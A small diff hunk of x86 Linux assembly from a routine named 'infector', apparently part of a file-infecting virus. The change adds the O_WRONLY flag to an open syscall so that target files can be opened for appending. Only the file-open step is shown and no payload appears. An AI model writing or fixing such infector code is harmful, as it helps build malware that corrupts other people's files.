@@ -69,6 +69,7 @@ infector:                   ;func that void infector(char*)
     openFile:
         mov edx, 0644o      ; 4th arg - mode
         mov ecx, 1024       ; 3rd arg - flags O_APPEND
+        or ecx, 1           ; or O_WRONLY
         mov ebx, [ebp+8]    ; 2nd arg - pointer to file name
         mov eax, 5          ; 1st arg - SYS_OPEN
         int 0x80            ; system_call
